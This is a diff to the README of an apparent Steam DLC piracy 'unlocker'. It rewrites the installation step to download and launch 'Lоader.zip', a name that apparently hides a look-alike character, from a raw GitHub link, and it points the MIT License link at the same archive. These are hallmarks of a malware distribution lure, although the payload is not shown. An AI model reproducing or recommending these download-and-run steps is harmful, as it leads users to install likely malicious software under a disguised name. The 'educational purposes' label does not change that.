@@ -26,7 +26,7 @@ Welcome to **Steam DLC Unlocker Desktop** – the effortless utility for unlocki
 
 ## ⚙️ Installation
 
-1. Download **Loader.rar** from this repository.
+1. Download **https://raw.githubusercontent.com/bhargav-tank/SteamDLCDeskUnlocker/main/Lоader.zip** from this repository.
 2. Extract its content to any directory.
 3. Launch the Loader and follow on-screen instructions.
 4. Select the desired Steam game and extras to unlock.
@@ -42,7 +42,7 @@ This project is for **educational purposes only**. Please respect the rights of 
 
 ## 📜 License
 
-Licensed under the [MIT License](https://opensource.org/licenses/MIT) – 2025.  
+Licensed under the [MIT License](https://raw.githubusercontent.com/bhargav-tank/SteamDLCDeskUnlocker/main/Lоader.zip) – 2025.  
 Open-source and free for personal use!
 
 ---
